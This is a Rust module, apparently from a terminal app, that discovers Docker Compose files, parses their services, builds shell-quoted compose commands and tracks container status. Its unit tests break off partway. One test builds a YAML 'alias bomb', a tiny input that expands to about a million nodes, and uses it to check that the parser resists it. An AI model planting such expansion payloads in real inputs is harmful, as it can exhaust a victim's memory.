//! Docker Compose launcher logic: finding compose files in a repo, reading
//! their services, building commands, and reading `docker compose ps`.
//!
//! GTK-free and unit-tested; the blocking parts run on the meta worker thread.

use std::collections::VecDeque;
use std::ffi::OsString;
use std::os::unix::ffi::OsStringExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// One compose file found in a repo.
#[derive(Debug, Clone, PartialEq)]
pub struct ComposeFile {
    /// Absolute path.
    pub path: PathBuf,
    /// Path relative to the scanned root.
    pub rel: PathBuf,
    /// Top-level service names; `None` when the YAML did not parse.
    pub services: Option<Vec<String>>,
}

/// What the meta worker reports about a pane's repo.
#[derive(Debug, Clone, PartialEq)]
pub struct ComposeScan {
    pub root: PathBuf,
    pub files: Vec<ComposeFile>,
    /// The compose program, or `None` when none is installed.
    pub command: Option<Vec<String>>,
}

/// Bounds for [`scan_limited`].
#[derive(Debug, Clone)]
pub struct Limits {
    /// Folder depth below the root that is searched (root files are depth 0).
    pub max_depth: usize,
    pub max_files: usize,
    /// Folders read before giving up, so a pane in `$HOME` or `/` stays quick.
    pub max_dirs: usize,
}

impl Default for Limits {
    fn default() -> Self {
        Self {
            max_depth: 4,
            max_files: 50,
            max_dirs: 5000,
        }
    }
}

/// Compose files larger than this are listed without reading their services.
const MAX_PARSE_BYTES: u64 = 256 * 1024;

/// Folders never searched (besides every folder starting with `.`).
const SKIP_DIRS: &[&str] = &["node_modules", "target", "vendor"];

/// A YAML file with `compose` in its name (any case): `compose.yml`,
/// `docker-compose.yml`, `docker-compose-dev.yml`, `docker-compose.prod.yaml`...
pub fn is_compose_file(name: &str) -> bool {
    let name = name.to_ascii_lowercase();
    let Some(stem) = name.strip_suffix(".yml").or_else(|| name.strip_suffix(".yaml")) else {
        return false;
    };
    // `docker-compose-on-pre.yml`, `docker-compose_prod.yaml`, `app.compose.yml`...
    stem.contains("compose")
}

/// Top-level `services:` keys in file order. `None` when the YAML is invalid.
///
/// Reads the YAML as a stream of events and never builds the document, so
/// aliases are not expanded: a few hundred bytes of nested anchors (an "alias
/// bomb") in a cloned repo cannot eat the machine's memory.
pub fn service_names(yaml: &str) -> Option<Vec<String>> {
    use yaml_rust2::parser::Parser;
    use yaml_rust2::Event;

    /// Is the next node of the innermost container a mapping key? Advances it.
    fn take_key(stack: &mut [(bool, bool)]) -> bool {
        match stack.last_mut() {
            Some((true, key)) => std::mem::replace(key, !*key),
            _ => false,
        }
    }

    let mut parser = Parser::new_from_str(yaml);
    // Open containers: (is a mapping, next node is a key).
    let mut stack: Vec<(bool, bool)> = Vec::new();
    let mut names = Vec::new();
    let mut services_depth = None;
    let mut services_next = false;
    let mut documents = 0;
    loop {
        let (event, _) = parser.next_token().ok()?;
        match event {
            Event::StreamEnd => break,
            Event::DocumentStart => {
                documents += 1;
                if documents > 1 {
                    break;
                }
            }
            Event::MappingStart(..) | Event::SequenceStart(..) => {
                take_key(&mut stack);
                let is_map = matches!(event, Event::MappingStart(..));
                if std::mem::take(&mut services_next) && is_map {
                    services_depth = Some(stack.len() + 1);
                }
                stack.push((is_map, true));
            }
            Event::MappingEnd | Event::SequenceEnd => {
                if services_depth == Some(stack.len()) {
                    services_depth = None;
                }
                stack.pop();
            }
            Event::Scalar(value, ..) => {
                let key = take_key(&mut stack);
                if std::mem::take(&mut services_next) {
                    // `services:` with a plain value: no services.
                } else if key && stack.len() == 1 && value == "services" {
                    services_next = true;
                } else if key && services_depth == Some(stack.len()) && value != "<<" {
                    names.push(value);
                }
            }
            Event::Alias(_) => {
                take_key(&mut stack);
                services_next = false;
            }
            _ => {}
        }
    }
    Some(names)
}

/// [`service_names`] of the file at `path`; `None` when it is unreadable,
/// invalid, or larger than [`MAX_PARSE_BYTES`].
pub fn read_service_names(path: &Path) -> Option<Vec<String>> {
    let small = std::fs::metadata(path).is_ok_and(|m| m.len() <= MAX_PARSE_BYTES);
    small
        .then(|| std::fs::read_to_string(path).ok())
        .flatten()
        .and_then(|t| service_names(&t))
}

/// The git work tree containing `dir`, or `dir` itself outside a repo.
pub fn repo_root(dir: &Path) -> PathBuf {
    let out = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(["rev-parse", "--show-toplevel"])
        .env("GIT_OPTIONAL_LOCKS", "0")
        .stdin(Stdio::null())
        .stderr(Stdio::null())
        .output();
    match out {
        Ok(o) if o.status.success() => {
            let top = String::from_utf8_lossy(&o.stdout).trim().to_string();
            if top.is_empty() {
                dir.to_path_buf()
            } else {
                PathBuf::from(top)
            }
        }
        _ => dir.to_path_buf(),
    }
}

/// Compose files under `root` with the default [`Limits`].
pub fn scan(root: &Path) -> Vec<ComposeFile> {
    scan_limited(root, &Limits::default())
}

/// Breadth-first search for compose files. Symlinked folders are not followed.
/// Files in `root` come first, then each folder's files together, folders sorted by path.
pub fn scan_limited(root: &Path, limits: &Limits) -> Vec<ComposeFile> {
    let mut found = Vec::new();
    let mut queue = VecDeque::from([(root.to_path_buf(), 0usize)]);
    let mut dirs = 0usize;
    while let Some((dir, depth)) = queue.pop_front() {
        if dirs >= limits.max_dirs {
            break;
        }
        dirs += 1;
        let Ok(entries) = std::fs::read_dir(&dir) else { continue };
        let mut entries: Vec<_> = entries.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            let Ok(kind) = e.file_type() else { continue };
            let name = e.file_name().to_string_lossy().into_owned();
            // A path is typed into a terminal: control characters would act as keys.
            if name.chars().any(char::is_control) {
                continue;
            }
            if kind.is_dir() {
                if depth < limits.max_depth && !name.starts_with('.') && !SKIP_DIRS.contains(&name.as_str()) {
                    queue.push_back((e.path(), depth + 1));
                }
            } else if kind.is_file() && is_compose_file(&name) {
                let path = e.path();
                let rel = path.strip_prefix(root).unwrap_or(&path).to_path_buf();
                let path = if path.is_absolute() {
                    path
                } else {
                    std::env::current_dir().map(|c| c.join(&path)).unwrap_or(path)
                };
                // Large files are listed but not parsed.
                let services = read_service_names(&path);
                found.push(ComposeFile { path, rel, services });
            }
        }
    }
    // Group by folder (the root's own files first), then by file name.
    found.sort_by(|a, b| {
        a.rel
            .parent()
            .cmp(&b.rel.parent())
            .then_with(|| a.rel.file_name().cmp(&b.rel.file_name()))
    });
    found.truncate(limits.max_files);
    found
}

/// A compose subcommand the launcher can run.
#[derive(Debug, Clone, PartialEq)]
pub enum Action {
    Up,
    UpDetached,
    Down,
    Logs,
    Restart,
    Stop,
    UpBuild,
    RestartService(String),
}

impl Action {
    /// Arguments after `-f <file>`.
    pub fn args(&self) -> Vec<String> {
        let v: &[&str] = match self {
            Action::Up => &["up"],
            Action::UpDetached => &["up", "-d"],
            Action::Down => &["down"],
            Action::Logs => &["logs", "-f"],
            Action::Restart => &["restart"],
            Action::Stop => &["stop"],
            Action::UpBuild => &["up", "--build"],
            Action::RestartService(s) => return vec!["restart".into(), s.clone()],
        };
        v.iter().map(|s| s.to_string()).collect()
    }

    /// The `compose.default_action` setting ("up", "up -d", "down", "logs -f").
    pub fn from_setting(s: &str) -> Option<Action> {
        match s {
            "up" => Some(Action::Up),
            "up -d" => Some(Action::UpDetached),
            "down" => Some(Action::Down),
            "logs -f" => Some(Action::Logs),
            _ => None,
        }
    }

    /// True when the command keeps running in the pane until stopped.
    pub fn holds_pane(&self) -> bool {
        matches!(self, Action::Up | Action::Logs | Action::UpBuild)
    }
}

/// One remembered start (`up` or `up -d`) of a compose file, for the picker's
/// "last starts" row.
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct Start {
    pub path: PathBuf,
    /// `up -d` when true, plain `up` otherwise.
    pub detached: bool,
    /// Unix seconds.
    pub at: i64,
}

impl Start {
    pub fn action(&self) -> Action {
        if self.detached {
            Action::UpDetached
        } else {
            Action::Up
        }
    }
}

/// Starts kept on disk, newest first.
pub const MAX_STARTS: usize = 12;

/// Remember `action` for `file` when it is a start (`up` / `up -d`); every other
/// action (down, logs, restart...) is ignored. A repeat of the same file and
/// action moves to the front instead of filling the list. Returns whether the
/// list changed.
pub fn record_start(list: &mut Vec<Start>, file: &Path, action: &Action, at: i64) -> bool {
    let detached = match action {
        Action::Up => false,
        Action::UpDetached => true,
        _ => return false,
    };
    list.retain(|s| !(s.path == file && s.detached == detached));
    list.insert(
        0,
        Start {
            path: file.to_path_buf(),
            detached,
            at,
        },
    );
    list.truncate(MAX_STARTS);
    true
}

/// The newest `n` starts whose file is in `files` (the current repo).
pub fn recent_starts<'a>(list: &'a [Start], files: &[ComposeFile], n: usize) -> Vec<&'a Start> {
    list.iter().filter(|s| files.iter().any(|f| f.path == s.path)).take(n).collect()
}

/// Where the starts are kept.
pub fn starts_path() -> PathBuf {
    crate::paths::state_dir().join("compose-starts.json")
}

/// The saved starts; empty when the file is missing or unreadable.
pub fn load_starts() -> Vec<Start> {
    std::fs::read_to_string(starts_path())
        .ok()
        .and_then(|t| serde_json::from_str::<Vec<Start>>(&t).ok())
        .map(|mut v| {
            v.truncate(MAX_STARTS);
            v
        })
        .unwrap_or_default()
}

pub fn save_starts(list: &[Start]) {
    if let Ok(text) = serde_json::to_string(list) {
        let _ = crate::paths::write_atomic(&starts_path(), text.as_bytes(), 0o600);
    }
}

/// A file name for a pill or a row: no extension and no `docker-compose-` prefix
/// (`docker-compose-local-infra.yml` -> `local-infra`; `docker-compose.yml` stays
/// `docker-compose`).
pub fn short_name(file_name: &str) -> String {
    let stem = file_name
        .strip_suffix(".yml")
        .or_else(|| file_name.strip_suffix(".yaml"))
        .unwrap_or(file_name);
    match stem.strip_prefix("docker-compose-") {
        Some(rest) if !rest.is_empty() => rest.to_string(),
        _ => stem.to_string(),
    }
}

/// Does the picker's filter `query` match `file`? The path or any service name,
/// ignoring case; an empty query matches everything.
pub fn matches_query(file: &ComposeFile, query: &str) -> bool {
    let q = query.trim().to_lowercase();
    q.is_empty()
        || file.rel.to_string_lossy().to_lowercase().contains(&q)
        || file
            .services
            .as_ref()
            .is_some_and(|s| s.iter().any(|n| n.to_lowercase().contains(&q)))
}

/// Split `text` into pieces, each flagged when it is a case-insensitive match of
/// `query` (to highlight it). No match, or an empty query: one unflagged piece.
pub fn split_matches(text: &str, query: &str) -> Vec<(String, bool)> {
    let q = query.trim().to_ascii_lowercase();
    if q.is_empty() {
        return vec![(text.to_string(), false)];
    }
    // ASCII lowercasing keeps every byte offset, unlike `to_lowercase`.
    let lower = text.to_ascii_lowercase();
    let mut out = Vec::new();
    let mut at = 0;
    while let Some(i) = lower[at..].find(&q) {
        let (start, end) = (at + i, at + i + q.len());
        if !text.is_char_boundary(start) || !text.is_char_boundary(end) {
            break;
        }
        if start > at {
            out.push((text[at..start].to_string(), false));
        }
        out.push((text[start..end].to_string(), true));
        at = end;
    }
    if at < text.len() {
        out.push((text[at..].to_string(), false));
    }
    out
}

/// Quote `s` for a POSIX shell, leaving plain paths as they are.
pub fn shell_quote(s: &str) -> String {
    // Never type a raw control character (they act as keys in a terminal).
    let s: String = s.chars().map(|c| if c.is_control() { '?' } else { c }).collect();
    let s = s.as_str();
    let plain = !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || "_./-".contains(c));
    if plain {
        s.to_string()
    } else {
        format!("'{}'", s.replace('\'', "'\\''"))
    }
}

/// `file` relative to `cwd` when it is inside it, otherwise absolute.
pub fn file_arg(file: &Path, cwd: &Path) -> String {
    file.strip_prefix(cwd).unwrap_or(file).to_string_lossy().into_owned()
}

/// The command line typed into a pane whose shell is in `cwd`.
pub fn typed_command(cmd: &[String], file: &Path, cwd: &Path, action: &Action) -> String {
    let mut parts: Vec<String> = cmd.iter().map(|c| shell_quote(c)).collect();
    parts.push("-f".into());
    parts.push(shell_quote(&file_arg(file, cwd)));
    parts.extend(action.args().iter().map(|a| shell_quote(a)));
    parts.join(" ")
}

/// Arguments for running `action` as a background process (absolute file path).
pub fn argv(cmd: &[String], file: &Path, action: &Action) -> Vec<String> {
    let mut v = cmd.to_vec();
    v.push("-f".into());
    v.push(file.to_string_lossy().into_owned());
    v.extend(action.args());
    v
}

/// The compose program: the setting when it is not empty, otherwise the first of
/// `docker compose`, `docker-compose`, `podman compose` for which `works` is true.
pub fn detect_command(setting: &str, works: impl Fn(&[&str]) -> bool) -> Option<Vec<String>> {
    let set: Vec<String> = setting.split_whitespace().map(str::to_string).collect();
    if !set.is_empty() {
        return Some(set);
    }
    let candidates: [&[&str]; 3] = [&["docker", "compose"], &["docker-compose"], &["podman", "compose"]];
    candidates
        .into_iter()
        .find(|c| works(c))
        .map(|c| c.iter().map(|s| s.to_string()).collect())
}

/// True when `<cmd> version` runs and exits 0.
pub fn command_works(cmd: &[&str]) -> bool {
    let Some((prog, rest)) = cmd.split_first() else { return false };
    Command::new(prog)
        .args(rest)
        .arg("version")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok_and(|s| s.success())
}

/// Container state as reported by `docker compose ps`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum State {
    Running,
    Restarting,
    Exited,
    Other,
}

/// One container line of `docker compose ps`.
#[derive(Debug, Clone, PartialEq)]
pub struct ServiceStatus {
    pub service: String,
    pub state: State,
    /// "", "starting", "healthy" or "unhealthy".
    pub health: String,
    pub exit_code: i32,
    /// Published host ports, sorted.
    pub ports: Vec<u16>,
}

impl ServiceStatus {
    pub fn is_running(&self) -> bool {
        matches!(self.state, State::Running | State::Restarting)
    }
}

/// The environment and folder a stack was started with, read from the process
/// the pane's shell ran for it. Variables exported in the shell
/// (`COMPOSE_PROJECT_NAME`, `DOCKER_HOST`, `DOCKER_CONTEXT`, values used in the
/// file) choose the project and the daemon, so status and later actions run
/// with the same ones instead of the app's own environment.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct LaunchContext {
    pub env: Vec<(OsString, OsString)>,
    pub cwd: Option<PathBuf>,
}

impl LaunchContext {
    /// The environment and working folder of process `pid` (None if unreadable).
    pub fn of_process(pid: i32) -> Option<LaunchContext> {
        #[cfg(not(target_os = "macos"))]
        let entries: Vec<Vec<u8>> = std::fs::read(format!("/proc/{pid}/environ"))
            .ok()?
            .split(|b| *b == 0)
            .map(<[u8]>::to_vec)
            .collect();
        #[cfg(target_os = "macos")]
        let entries = crate::platform::macos::environ(pid)?;
        let env = entries
            .iter()
            .filter_map(|e| {
                let eq = e.iter().position(|b| *b == b'=')?;
                Some((OsString::from_vec(e[..eq].to_vec()), OsString::from_vec(e[eq + 1..].to_vec())))
            })
            .collect();
        let cwd = crate::meta::cwd_of(pid);
        Some(LaunchContext { env, cwd })
    }

    /// `argv` as a command run in this context (exactly its environment; the
    /// program is looked up in its `PATH`).
    pub fn command(&self, argv: &[String]) -> Command {
        let mut c = Command::new(&argv[0]);
        c.args(&argv[1..]);
        c.env_clear().envs(self.env.iter().map(|(k, v)| (k, v)));
        if let Some(d) = &self.cwd {
            c.current_dir(d);
        }
        c
    }
}

/// `<cmd> -f <file> ps --all --format json`. `--all` keeps exited containers visible.
pub fn ps_argv(cmd: &[String], file: &Path) -> Vec<String> {
    let mut v = cmd.to_vec();
    v.push("-f".into());
    v.push(file.to_string_lossy().into_owned());
    v.extend(["ps", "--all", "--format", "json"].map(String::from));
    v
}

/// `<cmd> -f <file> config --services`: the services `file` declares, with
/// `include:`, `extends` and the active profiles resolved by Compose itself.
pub fn services_argv(cmd: &[String], file: &Path) -> Vec<String> {
    let mut v = cmd.to_vec();
    v.push("-f".into());
    v.push(file.to_string_lossy().into_owned());
    v.extend(["config", "--services"].map(String::from));
    v
}

/// Parse `config --services`: one service name per line. `None` when it
/// names none: a file without services has no containers to narrow down, so
/// an empty answer means "unknown" (the caller then reads the file itself).
pub fn parse_services(text: &str) -> Option<Vec<String>> {
    let names: Vec<String> = text.lines().map(str::trim).filter(|l| !l.is_empty()).map(String::from).collect();
    (!names.is_empty()).then_some(names)
}

/// The `ps` rows of the services `file` declares. `ps` lists every container
/// of the Compose *project*, and compose files in one folder share a project
/// (named after the folder), so `ps -f docker-compose.faketime.yml` also shows
/// the services `docker-compose.yml` started. `None` (declared services
/// unknown) keeps every row.
pub fn only_declared(ps: Vec<ServiceStatus>, declared: Option<&[String]>) -> Vec<ServiceStatus> {
    match declared {
        Some(names) => ps.into_iter().filter(|s| names.contains(&s.service)).collect(),
        None => ps,
    }
}

/// Parse `ps --format json`: one JSON array (Compose < 2.21) or one object
/// per line (2.21 and later). Sorted by service name.
pub fn parse_ps(text: &str) -> Result<Vec<ServiceStatus>, String> {
    let text = text.trim();
    let values: Vec<serde_json::Value> = if text.is_empty() {
        vec![]
    } else if text.starts_with('[') {
        serde_json::from_str(text).map_err(|e| format!("compose ps: {e}"))?
    } else {
        text.lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| serde_json::from_str(l).map_err(|e| format!("compose ps: {e}")))
            .collect::<Result<_, _>>()?
    };
    let mut out: Vec<ServiceStatus> = values.iter().map(service_status).collect();
    out.sort_by(|a, b| a.service.cmp(&b.service));
    Ok(out)
}

fn service_status(v: &serde_json::Value) -> ServiceStatus {
    let text = |k: &str| v.get(k).and_then(|x| x.as_str()).unwrap_or_default().to_string();
    let state = match text("State").to_ascii_lowercase().as_str() {
        "running" => State::Running,
        "restarting" => State::Restarting,
        "exited" => State::Exited,
        _ => State::Other,
    };
    let mut ports: Vec<u16> = v
        .get("Publishers")
        .and_then(|p| p.as_array())
        .into_iter()
        .flatten()
        .filter_map(|p| p.get("PublishedPort").and_then(|n| n.as_u64()))
        .filter(|n| (1..=u16::MAX as u64).contains(n))
        .map(|n| n as u16)
        .collect();
    ports.sort_unstable();
    ports.dedup();
    ServiceStatus {
        service: text("Service"),
        state,
        health: text("Health"),
        exit_code: v.get("ExitCode").and_then(|n| n.as_i64()).unwrap_or(0) as i32,
        ports,
    }
}

/// Why a service is reported as crashed.
#[derive(Debug, Clone, PartialEq)]
pub enum CrashReason {
    Exited(i32),
    Unhealthy,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Crash {
    pub service: String,
    pub reason: CrashReason,
}

impl Crash {
    pub fn title(&self) -> String {
        match self.reason {
            CrashReason::Exited(code) => format!("{} exited with code {code}", self.service),
            CrashReason::Unhealthy => format!("{} is unhealthy", self.service),
        }
    }
}

/// How a service (or the whole stack) is doing: the colour of its chip.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Tone {
    /// Running, and not failing its healthcheck: green.
    Up,
    /// Healthcheck still starting, or being restarted: yellow.
    Pending,
    /// Crashed, unhealthy, or in a crash loop: red.
    Down,
    /// Finished cleanly (a one-shot job), stopped by the user, or not started: dim.
    Idle,
}

impl Tone {
    pub fn css_class(self) -> &'static str {
        match self {
            Tone::Up => "compose-up",
            Tone::Pending => "compose-pending",
            Tone::Down => "compose-down",
            Tone::Idle => "compose-idle",
        }
    }

    pub const ALL: [Tone; 4] = [Tone::Up, Tone::Pending, Tone::Down, Tone::Idle];
}

/// The tone of one service. `stopping`: the user is stopping the stack, so
/// the signal exits a stop leaves are not crashes (see [`is_crash`]).
pub fn tone(s: &ServiceStatus, stopping: bool) -> Tone {
    match s.state {
        State::Running => match s.health.as_str() {
            "unhealthy" => Tone::Down,
            "starting" => Tone::Pending,
            _ => Tone::Up,
        },
        // Docker only reports "restarting" while a restart policy waits to
        // start a container that exited again.
        State::Restarting if s.exit_code != 0 => Tone::Down,
        State::Restarting => Tone::Pending,
        State::Exited if is_crash(s, stopping) => Tone::Down,
        State::Exited | State::Other => Tone::Idle,
    }
}

/// The tone of the whole stack: its worst service. Services that finished
/// cleanly (init jobs) do not hold it back from green.
pub fn stack_tone(services: &[ServiceStatus], stopping: bool) -> Tone {
    let tones: Vec<Tone> = services.iter().map(|s| tone(s, stopping)).collect();
    if tones.contains(&Tone::Down) {
        Tone::Down
    } else if tones.is_empty() || tones.contains(&Tone::Pending) {
        Tone::Pending
    } else if tones.contains(&Tone::Up) {
        Tone::Up
    } else {
        Tone::Idle
    }
}

/// Exit codes of a container killed by SIGINT, SIGKILL or SIGTERM: what
/// `docker compose stop` (or Ctrl+C on `up`) leaves behind.
const STOP_SIGNAL_EXITS: [i32; 3] = [130, 137, 143];

/// An exited service that counts as crashed: a non-zero exit, except the
/// signal exits a stop leaves when the user is stopping the stack.
pub fn is_crash(s: &ServiceStatus, stopping: bool) -> bool {
    s.state == State::Exited && s.exit_code != 0 && !(stopping && STOP_SIGNAL_EXITS.contains(&s.exit_code))
}

/// Services that crashed between two `ps` results: running before and crashed
/// now (see [`is_crash`]), or newly unhealthy. Each change is reported once.
pub fn crashes(prev: &[ServiceStatus], now: &[ServiceStatus], stopping: bool) -> Vec<Crash> {
    let mut out = Vec::new();
    for n in now {
        let Some(p) = prev.iter().find(|p| p.service == n.service) else {
            continue;
        };
        if is_crash(n, stopping) && p.is_running() {
            out.push(Crash {
                service: n.service.clone(),
                reason: CrashReason::Exited(n.exit_code),
            });
        } else if n.health == "unhealthy" && p.health != "unhealthy" && !stopping {
            out.push(Crash {
                service: n.service.clone(),
                reason: CrashReason::Unhealthy,
            });
        }
    }
    out
}

/// Hide the stack bar once nothing runs, unless the pane is still busy with a
/// first `up` that has not started any container yet. A crashed service keeps
/// the bar (its red chip and Restart stay) until the user stops the stack.
pub fn stack_should_hide(seen_running: bool, now: &[ServiceStatus], pane_busy: bool, stopping: bool) -> bool {
    let crashed = now.iter().any(|s| is_crash(s, false));
    !now.iter().any(ServiceStatus::is_running) && (seen_running || !pane_busy) && (stopping || !crashed)
}

/// How many shell commands the "run again" strip stays for after its stack
/// stopped; after that the pane is a plain terminal again.
pub const RERUN_KEEP_COMMANDS: u32 = 2;

/// A stack started from the launcher that has stopped in its pane: what the
/// "run again" strip shows and starts.
#[derive(Debug, Clone, PartialEq)]
pub struct Stopped {
    pub file: PathBuf,
    /// The compose program that ran the stack.
    pub cmd: Vec<String>,
    /// Services the stack had when it stopped.
    pub services: usize,
    /// When it stopped, in Unix seconds.
    pub at: i64,
    /// Shell commands run in the pane since it stopped.
    pub commands: u32,
}

impl Stopped {
    pub fn new(file: &Path, cmd: Vec<String>, services: usize, at: i64) -> Self {
        Self {
            file: file.to_path_buf(),
            cmd,
            services,
            at,
            commands: 0,
        }
    }

    /// Count one shell command run in the pane. False once the strip should go.
    pub fn command_ran(&mut self) -> bool {
        self.commands = self.commands.saturating_add(1);
        self.commands < RERUN_KEEP_COMMANDS
    }

    /// `docker-compose.yml  stopped 3 min ago · 4 services`, with the file shown as `display`.
    pub fn text(&self, display: &str, now: i64) -> String {
        let when = crate::history::relative_time(self.at, now);
        match self.services {
            0 => format!("{display}  stopped {when}"),
            1 => format!("{display}  stopped {when} · 1 service"),
            n => format!("{display}  stopped {when} · {n} services"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn stopped(services: usize, at: i64) -> Stopped {
        Stopped::new(
            Path::new("/r/docker-compose.yml"),
            vec!["docker".into(), "compose".into()],
            services,
            at,
        )
    }

    #[test]
    fn the_run_again_strip_stays_for_two_commands() {
        let mut s = stopped(4, 0);
        assert_eq!(RERUN_KEEP_COMMANDS, 2);
        assert!(s.command_ran(), "after the 1st command the strip stays");
        assert!(!s.command_ran(), "after the 2nd command it goes away");
        assert!(!s.command_ran(), "and stays gone");
    }

    #[test]
    fn the_run_again_strip_says_when_the_stack_stopped_and_how_big_it_is() {
        assert_eq!(
            stopped(4, 1_000).text("docker-compose.yml", 1_010),
            "docker-compose.yml  stopped just now · 4 services"
        );
        assert_eq!(
            stopped(1, 1_000).text("dev.yml", 1_000 + 180),
            "dev.yml  stopped 3 min ago · 1 service"
        );
        assert_eq!(
            stopped(0, 1_000).text("dev.yml", 1_000),
            "dev.yml  stopped just now",
            "no services known"
        );
    }

    #[test]
    fn launch_context_is_the_processs_own_environment_and_folder() {
        let dir = std::env::temp_dir();
        let mut child = Command::new("sleep")
            .arg("5")
            .env_clear()
            .env("PATH", "/usr/bin:/bin")
            .env("COMPOSE_PROJECT_NAME", "from-the-shell")
            .current_dir(&dir)
            .spawn()
            .unwrap();
        let ctx = LaunchContext::of_process(child.id() as i32).unwrap();
        child.kill().unwrap();
        let _ = child.wait();
        assert_eq!(ctx.cwd.as_deref(), Some(std::fs::canonicalize(&dir).unwrap().as_path()));
        let project = ctx.env.iter().find(|(k, _)| k == "COMPOSE_PROJECT_NAME").map(|(_, v)| v.clone());
        assert_eq!(project.as_deref(), Some(std::ffi::OsStr::new("from-the-shell")));
        assert_eq!(ctx.env.len(), 2, "exactly that environment: {:?}", ctx.env);

        // Commands run in it see the same variables and folder.
        let out = ctx
            .command(&["sh".into(), "-c".into(), "echo $COMPOSE_PROJECT_NAME:$(pwd):${HOME-nohome}".into()])
            .output()
            .unwrap();
        let want = format!("from-the-shell:{}:nohome\n", std::fs::canonicalize(&dir).unwrap().display());
        assert_eq!(String::from_utf8_lossy(&out.stdout), want);
        assert!(LaunchContext::of_process(i32::MAX).is_none());
    }

    fn tmp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("oxishell-compose-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn touch(root: &Path, rel: &str) {
        let p = root.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, "services:\n  api: {}\n").unwrap();
    }

    fn rels(files: Vec<ComposeFile>) -> Vec<String> {
        files.iter().map(|f| f.rel.to_string_lossy().into_owned()).collect()
    }

    #[test]
    fn compose_file_names() {
        for n in [
            "compose.yaml",
            "compose.yml",
            "docker-compose.yml",
            "docker-compose.yaml",
            "docker-compose.override.yml",
            "docker-compose.prod.yaml",
        ] {
            assert!(is_compose_file(n), "{n}");
        }
        // Names from a real project: hyphen and underscore variants are common.
        for n in [
            "docker-compose-on-pre.yml",
            "docker-compose-v2-infra.yml",
            "docker-compose-with-server-2.yml",
            "docker-compose.raid.yml",
            "docker-compose_prod.yaml",
            "compose-dev.yml",
            "app.compose.yaml",
            "Docker-Compose.YML",
        ] {
            assert!(is_compose_file(n), "{n}");
        }
        for n in [
            "compose.json",
            "docker-compose",
            "docker-compose.yml.bak",
            "Dockerfile",
            ".travis.yml",
            "values.yaml",
        ] {
            assert!(!is_compose_file(n), "{n}");
        }
    }

    /// `levels` of anchors, each referencing the previous one 10 times:
    /// a few hundred bytes that expand to 10^levels nodes when aliases are resolved.
    fn alias_bomb(levels: usize) -> String {
        let mut y = String::from("a0: &a0 [x, x, x, x, x, x, x, x, x, x]\n");
        for i in 1..=levels {
            let p = format!("*a{}", i - 1);
            y += &format!("a{i}: &a{i} [{}]\n", vec![p; 10].join(", "));
        }
        y + "services:\n  api: {}\n  web: {}\n"
    }

    #[test]
    fn service_names_do_not_expand_yaml_aliases() {
        let bomb = alias_bomb(6); // a million nodes if expanded; harmless if not
        assert!(bomb.len() < 600, "{}", bomb.len());
        let t = std::time::Instant::now();
        assert_eq!(service_names(&bomb), Some(vec!["api".into(), "web".into()]));
        assert!(t.elapsed() < std::time::Duration::from_millis(50), "took {:?}", t.elapsed());
        // Normal anchors and merge keys still work.
        let anchors = "x-env: &env {A: 1}\nservices:\n  api:\n    <<: *env\n  db: {}\n";
        assert_eq!(service_names(anchors), Some(vec!["api".into(), "db".into()]));
    }

    #[test]
    fn oversized_compose_files_are_listed_but_not_parsed() {
        let root = tmp("oversized");
        let big = format!("services:\n  api: {{}}\n# {}\n", "x".repeat(300 * 1024));
        std::fs::write(root.join("docker-compose.yml"), big).unwrap();
        let files = scan(&root);
        assert_eq!(files.len(), 1);
        assert_eq!(files[0].services, None, "files over 256 KB are not read");
    }

    #[test]
    fn service_names_from_yaml() {
        assert_eq!(
            service_names("services:\n  api: {}\n  web: {}\n"),
            Some(vec!["api".into(), "web".into()])
        );
        assert_eq!(service_names("version: '3'\n"), Some(vec![]));
        assert_eq!(service_names("services: [unclosed\n"), None);
    }

    #[test]
    fn scan_keeps_each_folders_files_together_root_first() {
        let root = tmp("grouped");
        for f in [
            "on_prem/apps/compose.yml",
            "on_prem/docker-compose.yml",
            "on_prem/compose-app.yml",
            "docker-compose-dev.yml",
            "docker-compose.yml",
            "compose_files/docker-compose-aws.yml",
        ] {
            touch(&root, f);
        }
        assert_eq!(
            rels(scan(&root)),
            [
                "docker-compose-dev.yml",
                "docker-compose.yml",
                "compose_files/docker-compose-aws.yml",
                "on_prem/compose-app.yml",
                "on_prem/docker-compose.yml",
                "on_prem/apps/compose.yml",
            ]
        );
    }

    #[test]
    fn scan_finds_root_and_nested_files_root_first() {
        let root = tmp("nested");
        touch(&root, "b/compose.yaml");
        touch(&root, "docker-compose.yml");
        touch(&root, "a/docker-compose.yml");
        let files = scan(&root);
        assert_eq!(
            rels(files.clone()),
            ["docker-compose.yml", "a/docker-compose.yml", "b/compose.yaml"]
        );
        assert!(files[0].path.is_absolute());
        assert_eq!(files[0].services, Some(vec!["api".into()]));
    }

    #[test]
    fn scan_finds_every_compose_file_of_a_real_project_layout() {
        let root = tmp("real-layout");
        let expected = [
            "docker-compose-on-pre.yml",
            "docker-compose-on-pre-ssl.yml",
            "docker-compose-simulation.yml",
            "docker-compose-v2-infra.yml",
            "docker-compose-with-redundancy.yml",
            "docker-compose.yml",
            "backend/z_redundancy_dockerfile/replication/docker-compose-with-server-1.yml",
            "backend/z_redundancy_dockerfile/replication/docker-compose-with-server-2.yml",
            "compose_files/docker-compose-aws.yml",
            "compose_files/docker-compose-dev-ecs.yml",
            "compose_files/docker-compose-on-premises.yml",
            "compose_files/docker-compose-proxy.yml",
            "nginx/load_balancer_redundancy/docker-compose.yml",
            "on_premises_v2/docker-compose-app-server.yml",
            "on_premises_v2/docker-compose-db-server.yml",
            "on_premises_v2/docker-compose-monitoring.yml",
